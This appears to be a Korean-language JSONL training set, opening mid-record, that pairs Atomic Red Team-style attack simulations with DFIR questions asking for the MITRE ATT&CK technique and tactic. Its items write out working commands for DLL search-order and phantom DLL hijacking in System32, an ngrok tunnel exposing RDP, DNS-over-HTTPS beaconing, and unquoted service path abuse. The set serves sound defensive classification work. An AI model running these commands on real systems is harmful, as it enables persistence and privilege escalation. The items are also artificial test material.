기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 이 테스트는 대문자·소문자 두 가지 문자 클래스만 포함된 비밀번호(onlyUPandLowChars)를 사용해 비밀번호 변경을 시도하며, 패스워드 정책이 최소 문자 클래스 개수(예: 3종 이상)를 실제로 강제하는지 확인한다. 정책 설정은 강하게 되어 있어도 도메인 기능 레벨이나 적용 오류로 인해 2종만으로도 변경이 허용될 수 있다. 성공 시 cred_file을 새 비밀번호로 갱신해 이후 테스트에서도 일관되게 사용할 수 있게 한다.\n[절차] cred_file에서 현재 사용자 비밀번호를 읽어 PSCredential 객체를 생성한다. 새 비밀번호(onlyUPandLowChars)가 cred_file 값과 동일한지 체크해 동일하면 테스트를 중단한다. ConvertTo-SecureString 'onlyUPandLowChars' -AsPlainText -Force 로 새 비밀번호를 준비한다. Set-ADAccountPassword로 비밀번호 변경을 시도하고, 실패 시 예외 및 ErrorCode를 출력한다. 성공 시 cred_file에 새 비밀번호를 저장한다.\n[대표 명령 예시]\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $newPassword = ConvertTo-SecureString 'onlyUPandLowChars' -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1098_T1098-10_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1098 Account Manipulation (Tactic: Persistence)\n[요약] 이 테스트는 Spring$((Get-Date).Year)! 형식의 시즌+연도+특수문자 조합 비밀번호를 설정하려고 시도해, 조직이 흔히 사용되는 패턴 기반 비밀번호를 차단하는지 확인한다. 이런 패턴은 크리덴셜 스터핑과 사전 공격에서 가장 먼저 시도되는 조합이다. 스크립트는 cred_file에 저장된 값과 새 비밀번호가 동일한지 확인한 뒤 Set-ADAccountPassword를 호출하고, 성공 시 cred_file을 새 비밀번호로 갱신한다.\n[절차] cred_file에서 현재 사용자 비밀번호를 읽어 PSCredential 객체를 생성한다. PowerShell에서 Spring$((Get-Date).Year)! 표현식으로 시즌+연도 조합의 새 비밀번호 문자열을 만든다. 새 비밀번호가 cred_file 값과 동일한지 비교해 동일하면 테스트를 중단한다. ConvertTo-SecureString <새 비밀번호> -AsPlainText -Force 로 SecureString을 생성한다. Set-ADAccountPassword로 비밀번호 변경을 시도하고, 성공 시 cred_file을 새 값으로 덮어쓴다.\n[대표 명령 예시]\n$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) { $cred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)); $new = \"Spring$((Get-Date).Year)!\"; $newPassword = ConvertTo-SecureString $new -AsPlainText -Force; Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.Password -NewPassword $newPassword }", "answer": "이 행위는 MITRE ATT&CK의 T1098 \"Account Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Persistence이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1001.002_T1001.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1001.002 Data Obfuscation via Steganography (Tactic: Exfiltration)\n[요약] 이미지 파일과 tar 아카이브를 사용해 데이터를 은닉하는 스테가노그래피 기반 데이터 유출 시나리오를 시뮬레이션한다. 랜덤 패스워드를 생성해 tar 파일에 저장한 뒤, 이미지 바이트와 이어붙여 새로운 이미지 파일을 만든다.\n[절차] 이미지 파일 존재 여부를 확인하거나 원격에서 다운로드한다. 랜덤 패스워드를 여러 개 생성해 텍스트 파일로 저장한다. 패스워드 파일을 포함하는 tar 아카이브를 생성한다. 원본 이미지와 tar 파일을 바이트 단위로 이어붙여 새로운 이미지를 만든다.\n[대표 명령 예시]\nGet-Content <image_file>, <tar_file> -Encoding byte -ReadCount 0 | Set-Content <new_image_file> -Encoding byte", "answer": "이 행위는 MITRE ATT&CK의 T1001.002 \"Data Obfuscation via Steganography\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1571_T1571-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1571 Non-Standard Port (Tactic: Command and Control)\n[요약] PowerShell의 Test-NetConnection cmdlet을 활용해 잘 사용되지 않는 포트에 대한 네트워크 연결을 시도하는 시나리오이다. 공격자가 8081과 같은 비표준 포트로 텔넷/C2 통신을 시도하는 행위를 모사한다. 실행 결과로 대상 호스트와 포트에 대한 연결 성공 여부 및 네트워크 세부 정보가 출력된다.\n[절차] 대상 호스트 도메인(<domain>)과 사용할 비표준 포트 번호(<port>)를 결정한다. PowerShell을 실행한다. Test-NetConnection -ComputerName <domain> -Port <port> 명령을 실행한다. 명령 실행 결과로 출력되는 TCP 테스트 결과, 응답 여부, 라운드 트립 시간 등을 확인한다.\n[대표 명령 예시]\nTest-NetConnection -ComputerName <domain> -Port <port>", "answer": "이 행위는 MITRE ATT&CK의 T1571 \"Non-Standard Port\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1572_T1572-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1572 Protocol Tunneling (Tactic: Command and Control)\n[요약] 감염된 호스트가 DNS over HTTPS(DoH)를 이용해 대량의 DNS 쿼리를 전송하는 상황을 시뮬레이션한다. 단일 호스트에서 특정 도메인으로 매우 많은 DoH 요청을 보내 임계치 기반 탐지를 트리거하는 것을 목표로 한다. 각 요청에 대해 도메인에 대한 DNS 정보가 JSON 형식으로 반환된다.\n[절차] 시뮬레이션에 사용할 DoH 서버 URL(<doh_server>), 기본 도메인(<domain>), 서브도메인(<subdomain>), 쿼리 타입(<query_type>), 전송할 쿼리 수(<query_volume>)를 결정한다. PowerShell 콘솔을 연다. for($i=0; $i -le <query_volume>; $i++) 루프를 사용해 Invoke-WebRequest로 DoH 서버에 반복적으로 요청을 전송한다. 각 요청에 대해 반환되는 DNS 응답(JSON)을 확인하고, 네트워크 모니터링 시스템에서 비정상적인 DoH 트래픽 패턴이 탐지되는지 관찰한다.\n[대표 명령 예시]\nfor($i=0; $i -le <query_volume>; $i++) { (Invoke-WebRequest \"<doh_server>?name=<subdomain>.$(Get-Random -Minimum 1 -Maximum 999999).<domain>&type=<query_type>\" -UseBasicParsing).Content }", "answer": "이 행위는 MITRE ATT&CK의 T1572 \"Protocol Tunneling\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1572_T1572-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1572 Protocol Tunneling (Tactic: Command and Control)\n[요약] 감염된 호스트가 DNS over HTTPS를 통해 주기적으로 C2 서버에 비콘을 보내는 행위를 시뮬레이션한다. 일정 시간(runtime) 동안, 기본 인터벌(c2_interval)과 지터(c2_jitter)를 적용해 변동 간격으로 DoH 쿼리를 전송한다. 이는 저빈도·장기적인 C2 통신 패턴을 탐지하는 데 유용하다.\n[절차] PathToAtomicsFolder로 지정된 경로 아래에 T1572\\src\\T1572-doh-beacon.ps1 스크립트가 존재하는지 확인한다. PowerShell을 실행한 뒤 Set-Location \"PathToAtomicsFolder\"를 통해 Atomic Red Team 루트 경로로 이동한다. T1572-doh-beacon.ps1 스크립트를 DoH 서버(<doh_server>), 도메인(<domain>), 서브도메인(<subdomain>), 쿼리 타입(<query_type>), C2 인터벌(<c2_interval>), 지터(<c2_jitter>), 실행 시간(<runtime>) 파라미터와 함께 실행한다. 지정된 시간 동안 주기적으로 발생하는 DoH 비콘 트래픽과 각 호출에 대한 DNS 응답(JSON)을 모니터링한다.\n[대표 명령 예시]\nSet-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer <doh_server> -Domain <domain> -Subdomain <subdomain> -QueryType <query_type> -C2Interval <c2_interval> -C2Jitter <c2_jitter> -RunTime <runtime>", "answer": "이 행위는 MITRE ATT&CK의 T1572 \"Protocol Tunneling\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1572_T1572-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1572 Protocol Tunneling (Tactic: Command and Control)\n[요약] 긴 도메인 이름을 사용해 DNS over HTTPS 쿼리를 전송하는 시나리오를 시뮬레이션한다. 서브도메인을 최대 길이(63바이트)에 가깝게 설정하고, 이를 포함한 도메인으로 DoH 요청을 보내 데이터 반환/유출 패턴을 모사한다. 긴 도메인 이름 기반 DoH 트래픽에 대한 탐지 임계값과 룰을 검증하는 데 활용된다.\n[절차] PathToAtomicsFolder\\T1572\\src\\T1572-doh-domain-length.ps1 스크립트가 존재하는지 확인한다. 실험에 사용할 DoH 서버(<doh_server>), 기본 도메인(<domain>), 63자 길이에 가까운 서브도메인(<subdomain>), 쿼리 타입(<query_type>)을 설정한다. PowerShell에서 Set-Location \"PathToAtomicsFolder\" 명령으로 Atomic Red Team 루트 경로로 이동한다. T1572-doh-domain-length.ps1 스크립트를 위 파라미터와 함께 실행해 점점 길어지는 도메인 이름을 포함한 DoH 쿼리를 전송한다. 네트워크 모니터링 도구에서 도메인 길이가 비정상적으로 긴 DoH 요청이 탐지되는지 확인한다.\n[대표 명령 예시]\nSet-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer <doh_server> -Domain <domain> -Subdomain <subdomain> -QueryType <query_type>", "answer": "이 행위는 MITRE ATT&CK의 T1572 \"Protocol Tunneling\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1572_T1572-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1572 Protocol Tunneling (Tactic: Command and Control)\n[요약] ngrok을 다운로드 및 실행하여 로컬 포트(기본값 3389, RDP)에 대한 TCP 터널을 인터넷으로 노출하는 시나리오를 시뮬레이션한다. 공격자는 이를 통해 방화벽·NAT 뒤에 있는 내부 시스템에 원격으로 접근할 수 있는 C2/원격 제어 채널을 구성할 수 있다.\n[절차] 테스트에 사용할 ngrok API 토큰(<api_token>), 터널로 노출할 로컬 포트 번호(<port_num>), ngrok 다운로드 URL(<download>)을 준비한다. 사전 조건을 실행해 C:\\Users\\Public\\ngrok 디렉터리가 존재하고, 해당 위치에 ngrok 실행 파일이 다운로드·압축 해제되어 있는지 확인한다(없으면 Invoke-WebRequest와 Expand-Archive로 자동 준비). PowerShell에서 C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken <api_token> 명령을 통해 인증 토큰을 설정한다. Start-Job을 사용해 ngrok.exe tcp <port_num> 명령을 백그라운드 잡으로 실행하여 TCP 터널을 생성한다. 잠시 대기한 후(Start-Sleep), 필요 시 Start-Job으로 생성된 잡을 중지하고 테스트를 종료한다.\n[대표 명령 예시]\nC:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken <api_token> | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp <port_num> } | Out-Null\nStart-Sleep -s 5\nStop-Job -Name Job1 | Out-Null", "answer": "이 행위는 MITRE ATT&CK의 T1572 \"Protocol Tunneling\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Command and Control이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.001_T1574.001-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.001 Hijack Execution Flow: DLL (Tactic: Privilege Escalation)\n[요약] PowerShell 실행 파일을 다른 이름(updater.exe)으로 복사하고 동일 디렉터리에 amsi.dll을 배치해 검색 순서를 악용하는 DLL 검색 순서 하이재킹 시나리오이다. 비표준 경로에서 amsi.dll을 로드하도록 유도해 AMSI 우회 가능성을 검증한다.\n[절차] %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe를 %APPDATA%\\updater.exe로 복사한다. %windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사해 updater.exe와 같은 디렉터리에 둔다. %APPDATA%\\updater.exe -Command exit 를 실행해 검색 순서에 따라 %APPDATA%\\amsi.dll이 로드되는지 확인한다. DFIR 관점에서 새 위치의 updater.exe 및 amsi.dll 생성 여부와 해당 경로에서의 모듈 로딩 흔적을 확인한다.\n[대표 명령 예시]\ncopy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\r\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\n%APPDATA%\\updater.exe -Command exit", "answer": "이 행위는 MITRE ATT&CK의 T1574.001 \"Hijack Execution Flow: DLL\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.001_T1574.001-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.001 Hijack Execution Flow: DLL (Tactic: Privilege Escalation)\n[요약] .NET 구성 요소가 APPX_PROCESS 환경 변수를 참조해 WinAppXRT.dll을 로드하는 동작을 악용하는 팬텀 DLL 하이재킹 시나리오이다. amsi.dll을 기반으로 한 WinAppXRT.dll을 사용자 프로파일 및 system32 경로에 배치하고 APPX_PROCESS 값을 설정하여, .NET 애플리케이션 실행 시 공격자가 지정한 DLL을 자동 로드하도록 유도한다.\n[절차] %windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사한다. %APPDATA%\\amsi.dll 파일 이름을 WinAppXRT.dll로 변경한다. 변경된 %APPDATA%\\WinAppXRT.dll을 %windir%\\System32\\WinAppXRT.dll로 복사한다. reg add 명령을 사용해 HKEY_CURRENT_USER\\Environment 키에 APPX_PROCESS 값(REG_EXPAND_SZ, 데이터 \"1\")을 추가한다. .NET 기반 애플리케이션을 실행해 WinAppXRT.dll이 system32 및 PATH 상 위치에서 로드되는지 확인한다.\n[대표 명령 예시]\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\nren %APPDATA%\\amsi.dll WinAppXRT.dll\r\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\r\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f", "answer": "이 행위는 MITRE ATT&CK의 T1574.001 \"Hijack Execution Flow: DLL\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.001_T1574.001-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.001 Hijack Execution Flow: DLL (Tactic: Privilege Escalation)\n[요약] 인쇄 스풀러(Print Spooler) 서비스가 시작될 때 system32의 ualapi.dll을 로드하는 동작을 악용하는 팬텀 DLL 하이재킹 시나리오이다. amsi.dll을 ualapi.dll로 위장해 system32에 배치하고 Spooler 서비스를 자동 시작으로 설정하여, 시스템 시작 시 악성 ualapi.dll이 로드되도록 한다.\n[절차] %windir%\\System32\\amsi.dll을 %APPDATA%\\amsi.dll로 복사한다. %APPDATA%\\amsi.dll 파일 이름을 ualapi.dll로 변경한다. 변경된 %APPDATA%\\ualapi.dll을 %windir%\\System32\\ualapi.dll로 복사한다. sc config Spooler start=auto 명령을 실행해 Print Spooler 서비스를 자동 시작으로 설정한다. 시스템 재부팅 후 또는 Spooler 서비스 재시작 시 system32\\ualapi.dll이 로드되는지 확인한다.\n[대표 명령 예시]\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\r\nren %APPDATA%\\amsi.dll ualapi.dll\r\ncopy %APPDATA%\\ualapi.dll %windir%\\System32\\ualapi.dll\r\nsc config Spooler start=auto", "answer": "이 행위는 MITRE ATT&CK의 T1574.001 \"Hijack Execution Flow: DLL\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.001_T1574.001-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.001 Hijack Execution Flow: DLL (Tactic: Privilege Escalation)\n[요약] Notepad++ 업데이트에 사용되는 서명된 GUP.exe 바이너리를 이용해 DLL 사이드로딩을 수행하는 시나리오이다. 취약한 GUP.exe를 지정된 경로에 배치한 뒤 실행하여, 같은 디렉터리의 libcurl.dll 등 악성 DLL이 로드되도록 유도하고 최종적으로 calculator.exe(또는 지정한 프로세스)를 실행한다.\n[절차] 테스트에 사용할 프로세스 이름(<process_name>)과 GUP 실행 파일 경로(<gup_executable>)를 결정한다. 사전 조건에서 <gup_executable> 경로에 GUP.exe가 존재하는지 확인하고, 없으면 GitHub에서 다운로드해 배치한다. 명령 프롬프트 또는 PowerShell에서 \"<gup_executable>\"을 실행한다. DLL 사이드로딩이 성공하면 지정된 프로세스(기본값 calculator.exe)가 생성되는지 확인한다.\n[대표 명령 예시]\n\"<gup_executable>\"", "answer": "이 행위는 MITRE ATT&CK의 T1574.001 \"Hijack Execution Flow: DLL\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.001_T1574.001-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.001 Hijack Execution Flow: DLL (Tactic: Privilege Escalation)\n[요약] DOTNET_STARTUP_HOOKS 환경 변수를 사용해 .NET Core 애플리케이션 시작 시 특정 어셈블리(preloader.dll)의 메서드를 자동 실행하는 시나리오이다. dotnet -h 실행만으로도 preloader.dll이 로드되며, 이를 통해 .NET 프로세스 내부에서 악성 코드 실행이나 추가 DLL 사이드로딩을 수행할 수 있다.\n[절차] 테스트에 사용할 프로세스 이름(<process_name>)과 preloader DLL 경로(<preloader_dll>)를 결정한다. 사전 조건에서 .NET SDK가 설치되어 있는지(C:\\Program Files\\dotnet\\dotnet.exe) 확인하고, 없으면 winget을 통해 설치한다. <preloader_dll> 경로에 preloader.dll이 존재하지 않으면 GitHub에서 다운로드해 배치한다. 명령 프롬프트에서 set DOTNET_STARTUP_HOOKS=\"<preloader_dll>\" 명령을 실행해 현재 세션의 환경 변수로 등록한다. dotnet -h > nul 명령을 실행해 .NET 도움말을 호출하면서 preloader.dll이 로드되도록 한다. preloader에 구성된 페이로드(예: calculator.exe 실행)가 정상적으로 수행되는지 확인한다.\n[대표 명령 예시]\nset DOTNET_STARTUP_HOOKS=\"<preloader_dll>\"\r\ndotnet -h > nul\r\necho.", "answer": "이 행위는 MITRE ATT&CK의 T1574.001 \"Hijack Execution Flow: DLL\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.001_T1574.001-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.001 Hijack Execution Flow: DLL (Tactic: Privilege Escalation)\n[요약] 공식 KeyScrambler 설치 프로그램을 사용해 KeyScrambler를 설치한 뒤, KeyScrambler.exe를 TEMP 디렉터리로 복사해 실행하는 시나리오이다. 해당 실행 파일은 현재 작업 디렉터리에서 KeyScramblerIE.dll을 찾으므로, 공격자는 동일 폴더에 악성 KeyScramblerIE.dll을 배치해 DLL 사이드로딩 및 검색 순서 하이재킹을 수행할 수 있다.\n[절차] PowerShell에서 KeyScrambler 설치 프로그램을 공식 사이트에서 %TEMP%\\KeyScrambler_Setup.exe로 다운로드한다. 다운로드한 설치 프로그램을 /S 옵션으로 무인 설치하여 C:\\Program Files (x86)\\KeyScrambler 아래에 KeyScrambler를 설치한다. 설치된 C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe를 $env:TEMP\\KeyScrambler.exe로 복사해 권한 문제를 피한다. $env:TEMP\\KeyScrambler.exe를 실행하여 현재 디렉터리(TEMP)에서 KeyScramblerIE.dll을 찾도록 유도한다. KeyScramblerIE.dll이 없을 경우 누락 팝업이 표시되며, 실제 공격 시에는 동일 경로에 수정된 KeyScramblerIE.dll을 배치해 악성 코드 실행에 활용할 수 있다.\n[대표 명령 예시]\nWrite-Host 1.Downloading KeyScrambler from official website to temp directory\r\nInvoke-WebRequest -Uri \"https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe\" -OutFile $env:Temp\\KeyScrambler_Setup.exe\r\nWrite-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory\r\nStart-Process -FilePath $env:Temp\\KeyScrambler_Setup.exe -ArgumentList /S -Wait\r\nWrite-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp\r\nCopy-Item \"C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe\" -Destination $env:TEMP\\KeyScrambler.exe\r\nWrite-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup\r\nStart-Process -FilePath $env:Temp\\KeyScrambler.exe\r\nWrite-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker", "answer": "이 행위는 MITRE ATT&CK의 T1574.001 \"Hijack Execution Flow: DLL\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.008_T1574.008-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.008 Hijack Execution Flow: Path Interception by Search Order Hijacking (Tactic: Privilege Escalation)\n[요약] Colibri 로더가 사용하는 기법을 모사해, PowerShell 기본 모듈 이름(Get-Variable.exe)과 동일한 이름의 실행 파일을 %LocalAppData%\\Microsoft\\WindowsApps 경로에 생성하는 시나리오이다. 이후 PowerShell -noprofile을 실행할 때 검색 순서를 악용해 공격자 바이너리가 먼저 호출되도록 하여, 계산기(calc)를 실행하는 형태의 지속성/하이재킹 동작을 시뮬레이션한다.\n[절차] C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe( C# 컴파일러)가 존재하는지 확인한다. PathToAtomicsFolder\\T1574.008\\bin\\calc.cs 소스 파일이 존재하는지 확인한다. csc.exe를 사용해 calc.cs를 컴파일하고, 출력 파일을 %LocalAppData%\\Microsoft\\WindowsApps\\Get-Variable.exe로 지정한다. PowerShell -noprofile을 실행해 기본 모듈 호출 과정에서 PATH/검색 순서에 의해 %LocalAppData%\\Microsoft\\WindowsApps\\Get-Variable.exe가 사용되는지(계산기 실행 여부) 확인한다. DFIR 관점에서 WindowsApps 폴더 내 Get-Variable.exe 생성 여부와 PowerShell 실행 시 해당 경로 참조 흔적을 수집한다.\n[대표 명령 예시]\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile", "answer": "이 행위는 MITRE ATT&CK의 T1574.008 \"Hijack Execution Flow: Path Interception by Search Order Hijacking\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1574.009_T1574.009-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1574.009 Hijack Execution Flow: Path Interception by Unquoted Path (Tactic: Privilege Escalation)\n[요약] 공백이 포함된 서비스 실행 경로를 따옴표로 감싸지 않고 설정해 Unquoted Service Path 취약점을 유발하는 시나리오이다. C:\\Program Files\\windows_service.exe를 서비스 경로로 등록한 뒤 C:\\program.exe를 배치하여, 서비스 시작 시 실제로는 C:\\program.exe가 SYSTEM 권한으로 실행되는 동작을 모사한다.\n[절차] 테스트에 사용할 서비스 실행 파일 경로(<service_executable>)를 확인한다(기본값: PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe). \"C:\\Program Files\\windows_service.exe\" 위치로 <service_executable>을 복사해 서비스용 실행 파일을 준비한다. \"C:\\program.exe\" 위치로 동일한 <service_executable>을 복사해 하이재킹용 실행 파일을 준비한다. sc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto 명령으로 따옴표가 없는 경로를 가진 서비스를 생성한다. sc start \"Example Service\" 명령으로 서비스를 시작하여, 경로 파싱 특성에 의해 C:\\program.exe가 SYSTEM 권한으로 실행되는지 확인한다(예: C:\\Time.log 생성 여부 등).\n[대표 명령 예시]\ncopy \"<service_executable>\" \"C:\\Program Files\\windows_service.exe\"\r\ncopy \"<service_executable>\" \"C:\\program.exe\"\r\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\r\nsc start \"Example Service\"", "answer": "이 행위는 MITRE ATT&CK의 T1574.009 \"Hijack Execution Flow: Path Interception by Unquoted Path\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Privilege Escalation이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
